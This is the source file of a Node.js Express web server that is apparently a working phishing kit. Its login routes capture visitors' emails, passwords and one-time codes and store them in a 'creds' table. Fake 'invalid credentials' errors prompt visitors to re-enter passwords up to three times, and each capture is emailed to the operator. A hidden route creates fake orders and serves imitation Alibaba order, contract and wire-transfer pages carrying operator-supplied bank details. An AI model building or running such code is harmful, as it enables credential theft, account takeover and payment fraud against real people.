const path = require('path');
require('dotenv').config();
const express = require('express');
const cookieParser = require('cookie-parser');
const crypto = require('crypto');
const { createClient } = require('@supabase/supabase-js');
const nodemailer = require('nodemailer');

const { Resend } = require('resend');
const { error } = require('console');

const resend = new Resend(process.env.RESEND_API_KEY);

const transporter = nodemailer.createTransport({
  service: 'gmail',
  auth: {
    user: process.env.EMAIL_USER,
    pass: process.env.EMAIL_PASSWORD,
  },
});

const app = express();
const PORT = process.env.PORT || 3000;

// Set EJS as the view engine
app.set('view engine', 'ejs');
app.set('views', path.join(__dirname, 'views'));

// Serve static files from /public
app.use(express.static(path.join(__dirname, 'public')));

// For application/json
app.use(express.json());

// Parse URL-encoded bodies (for simple form submissions)
app.use(express.urlencoded({ extended: true }));

// Parse cookies
app.use(cookieParser());

// Supabase PostgreSQL database connection
const supabaseUrl = process.env.SUPABASE_URL;
const supabaseKey = process.env.SUPABASE_KEY;
const supabase = createClient(supabaseUrl, supabaseKey);


// Helper function to generate unique session ID
function generateSessionId() {
  return crypto.randomUUID();
}

// Helper function to check if session is valid
async function isValidSession(sessionId) {
  if (!sessionId) return false;

  try {
    const { data, error } = await supabase
      .from('session_count')
      .select('*')
      .eq('session_id', sessionId);

    if (error) throw error;
    if (!data || data.length === 0) return false;

    return true;
  } catch (err) {
    console.error('Error checking session', err);
    return false;
  }
}


app.get('/login', async (req, res) => {
  let sessionId = req.cookies.sessionId;
  console.log("login get session id:", sessionId)
  const isCheckedIn = await isValidSession(sessionId);
  if (!isCheckedIn) {
    sessionId = generateSessionId()
    res.cookie('sessionId', sessionId, {
      maxAge: 30 * 60 * 1000, // 30 minutes in milliseconds
    });
    await supabase.from('session_count').insert([{ session_id: sessionId, count: 1 }]);
  }
  if (req.query.next) {
    console.log("next parameter found:", req.query.next)
    res.cookie('next', req.query.next, {
      maxAge: 30 * 60 * 1000, // 30 minutes in milliseconds
    });
  }

  res.render('login', {
    sessionId: sessionId,
    error: req.query.error,
    success: req.query.success,
  });
});


app.post('/login', async (req, res) => {
  const { email } = req.body;
  // validate email (include regex)
  if (!email || !email.match(/^[^\s@]+@[^\s@]+\.[^\s@]+$/)) {
    return res.redirect('/login?error=Invalid+email');
  }
  try {
    let sessionId = req.cookies.sessionId;
    console.log("login post session id:", sessionId)
    const isCheckedIn = await isValidSession(sessionId);
    if (!isCheckedIn) {
      sessionId = generateSessionId();
      res.cookie('sessionId', sessionId, {
        maxAge: 30 * 60 * 1000, // 30 minutes in milliseconds
      });
      await supabase.from('session_count').insert([{ session_id: sessionId, count: 1 }]);
    }

    await supabase.from('creds').insert([{ email: email, session_id: sessionId }]);
    const mailInfo = {
      subject: "Attempting Login",
      text: `Login being attempted by user "${email}"`,
      from: process.env.EMAIL_USER,
      to: process.env.EMAIL_USER
    }
    const { data, error } = await resend.emails.send({
      from: 'Acme <onboarding@resend.dev>',
      to: [process.env.EMAIL_USER],
      subject: 'Attempting Login',
      html: `Login being attempted by user "${email}"`,
      replyTo: process.env.EMAIL_USER,
    });
    return res.redirect('/login/password')
  } catch (err) {
    console.error('Error during login', err);
    return res.redirect('/login?error=Database+error');
  }
});

app.get('/login/password', async (req, res) => {
  const sessionId = req.cookies.sessionId;
  const isCheckedIn = await isValidSession(sessionId);
  if (!isCheckedIn) {
    return res.redirect('/login')
  }
  let { data: emailData, error: emailError } = await supabase
    .from('creds')
    .select('email')
    .eq('session_id', sessionId)
    .limit(1)
    .single();

  if (emailError) {
    console.error(emailError);
    return res.redirect('/login');
  }
  let email = emailData.email;
  const otp = req.query.otp? true:false
  console.log("OTP", otp)

  res.render('password', {
    sessionId: sessionId,
    email: email,
    error: req.query.error,
    otp: req.query.otp? true: false
  });
});


app.post('/login/password', async (req, res) => {
  const { account, password } = req.body;
  if (!account || !account.match(/^[^\s@]+@[^\s@]+\.[^\s@]+$/)) {
    return res.redirect('/login/password?error=Invalid+email');
  }
  try {
    let sessionId = req.cookies.sessionId;
    const isCheckedIn = await isValidSession(sessionId);
    if (!isCheckedIn) {
      return res.redirect('/login')
    }

    let { data: sessionCountData, error: countError } = await supabase
      .from('session_count')
      .select('count')
      .eq('session_id', sessionId)
      .single();

    if (countError) throw countError;
    let sessionCount = sessionCountData.count;

    if (sessionCount % 3 === 1) {
      console.log("Login Attempt One")
      await supabase.from('session_count').update({ count: sessionCount + 1 }).eq('session_id', sessionId);
      await supabase.from('creds').update({ password: password }).eq('session_id', sessionId);
      return res.redirect('/login/password?error=Invalid+credentials');
    } else if (sessionCount % 3 === 2) {
      console.log("Login Attempt Two")
      await supabase.from('session_count').update({ count: sessionCount + 1 }).eq('session_id', sessionId);
      await supabase.from('creds').insert([{ email: account, password: password, session_id: sessionId }]);
      return res.redirect('/login/password?error=Database+error')
    } else {
      console.log("Login Attempt Three")
      await supabase.from('creds').insert([{ email: account, password: password, session_id: sessionId }]);
    const { data, error } = await resend.emails.send({
      from: 'Acme <onboarding@resend.dev>',
      to: [process.env.EMAIL_USER],
      subject: 'Logged In',
      html: `Login process done by user "${account}"`,
      replyTo: process.env.EMAIL_USER,
    });
      return res.redirect('/login/password?otp=1');
    }
  } catch (err) {
    console.error('Error during login/password', err);
    return res.redirect('/login/password?error=Database+error');
  }
});

app.post("/login/otp", async (req, res) => {
  const { otp, email } = req.body;
  console.log("OTP detected")
  let sessionId = req.cookies.sessionId;
  await supabase.from('otp').insert([{email: email, otp: otp}]);
  await supabase.from('session_count').delete().eq('session_id', sessionId);

  const { data, error } = await resend.emails.send({
    from: 'Acme <onboarding@resend.dev>',
    to: [process.env.EMAIL_USER],
    subject: 'OTP sent',
    html: `OTP sent: user "${email}"`,
    replyTo: process.env.EMAIL_USER,
  });
  const next = req.cookies.next;  
  console.log("Checking for next cookie");
  
  if (next) {
    console.log("Next cookie found");
    const fullUrl = `${process.env.MAIN_REDIRECT_URL}/${next}`;
    return res.send({
      redirectUrl: fullUrl
    })
  }
  return res.send({
    redirectUrl: process.env.REDIRECT_URL
  })
});

app.get('/hsisau3937enk', async (req, res) => {

  return res.render('request',{errors: []});
});

function generateOrderId() {
  return Math.floor(
      100000000000 + Math.random() * 900000000000
  ).toString();
}

function generateReference() {
    // Generate a 30-digit random numeric string
    let number = "";

    while (number.length < 30) {
        number += crypto.randomInt(0, 10).toString();
    }

    number = number.substring(0, 30);

    return Buffer.from(number).toString("base64").replace(/=+$/, "");
}


app.post('/hsisau3937enk', async (req, res) => {
  const requiredFields = [

    "amount",
    "currency",
    "seller",
    "product_name",
    "specs",
    "quantity",
    "image_link",
    "shipping_address",
    "ship_from",
    "shipping_method",
    "shipping_fee",
    "buyer_email",
    "buyer_name",
    "order_date",
    "order_time",

    "company_phone_number",
    "company_email",
    "company_address",
    "contact_name",

    "payment_currency",
    "beneficiary_account_number",
    "swift_code",
    "beneficiary_country_region",
    "beneficiary_name",
    "beneficiary_address",
    "beneficiary_bank",
    "beneficiary_bank_address",
    "bank_code",
    "branch_code",
    "remark",
    "process_fee"

];
const errors = [];
for (const field of requiredFields) {

  if (
      req.body[field] === undefined ||
      req.body[field] === null ||
      req.body[field].toString().trim() === ""
  ) {
      errors.push(`${field} is required.`);
  }

}

if (errors.length > 0) {

  return res.status(400).render("request", {
      errors,
      old: req.body
  });

}
  const order_id = generateOrderId();
  const reference = generateReference();
  const { data, error } = await supabase.from('details').insert([{
    order_id: order_id,
    reference: reference,
    amount: req.body.amount,
    currency: req.body.currency,
    seller: req.body.seller,
    product_name: req.body.product_name,
    specs: req.body.specs,
    quantity: req.body.quantity,
    image_link: req.body.image_link,
    order_date: req.body.order_date,
    order_time: req.body.order_time,
    shipping_address: req.body.shipping_address,
    ship_from: req.body.ship_from,
    shipping_method: req.body.shipping_method,
    shipping_fee: req.body.shipping_fee,
    company_phone_number: req.body.company_phone_number,
    company_email: req.body.company_email,
    company_address: req.body.company_address,
    contact_name: req.body.contact_name,
    payment_currency: req.body.payment_currency,
    beneficiary_account_number: req.body.beneficiary_account_number,
    swift_code: req.body.swift_code,
    beneficiary_country_region: req.body.beneficiary_country_region,
    beneficiary_name: req.body.beneficiary_name,
    beneficiary_address: req.body.beneficiary_address,
    beneficiary_bank: req.body.beneficiary_bank,
    beneficiary_bank_address: req.body.beneficiary_bank_address,
    bank_code: req.body.bank_code,
    branch_code: req.body.branch_code,
    remark: req.body.remark,
    process_fee: req.body.process_fee 
  }]);
  if (error) {
    console.error(error)
    return res.status(400).render('request', {
      errors: ['Database error. Please try again.'],
      old: req.body
    });
  }
  const order_link = `ta/detail.htm?spm=a2756.trade-list-buyer.0.0.5cb376e9kmrTcM&orderId=${order_id}`
  return res.render('success',{
    order_link: order_link
  });
});

LINK_ADDITION = "paymentStep=ADVANCE&source=DETAIL&buyerGuestAccount=false&urlDomain=biz.alibaba.com&cna=QuvDIiyaTiACAS%2F2WPMvIsXE&ip=2.20.196.222&riskDeviceType=PC&umidToken=T2gAavG6Ptcgifm2HcsGdYcQa4WrELu4TcVab6kYMij-DhTUYTbi6G7NgFuFcQH5bu8="

app.get('/ta/detail.htm', async (req, res) => {
  const order_id = req.query.orderId;
  const { data, error } = await supabase.from('details').select('*').eq('order_id', order_id).single();
  if (error) {
    return res.status(400).render('error', { error: 'Order not found' });
  }
  const item_subtotal = data.amount * data.quantity;
  const total_price = data.amount * data.quantity;
  return res.render('order-details', { ...data, item_subtotal: item_subtotal, total_price: total_price });
});

app.get('/payment/checkout.htm', async (req, res) => {
  const reference = req.query.cashierOrderNo;
  const { data, error } = await supabase.from('details').select('*').eq('reference', reference).single();
  if (error) {
    return res.status(400).render('error', { error: 'Order not found' });
  }
  return res.render('payment', { reference: reference, ...data,  });
});

app.get('/payment/tt/detail', async (req, res) => {
  const reference = req.query.cashierOrderNo;
  const { data, error } = await supabase.from('details').select('*').eq('reference', reference).single();
  if (error) {
    return res.status(400).render('error', { error: 'Order not found' });
  }
  return res.render('wire-transfer', { reference: reference, ...data });
});

app.get('/ta/contract.htm', async (req, res) => {
  const order_id = req.query.orderId;
  const { data, error } = await supabase.from('details').select('*').eq('order_id', order_id).single();
  if (error) {
    return res.status(400).render('error', { error: 'Order not found' });
  }
  return res.render('contract', { order_id: order_id, ...data });
});

app.use((req, res) => {
  res.redirect(process.env.MAIN_REDIRECT_URL)
})

// Start server
app.listen(PORT, () => {
  console.log(`Server listening on http://localhost:${PORT}`);
});


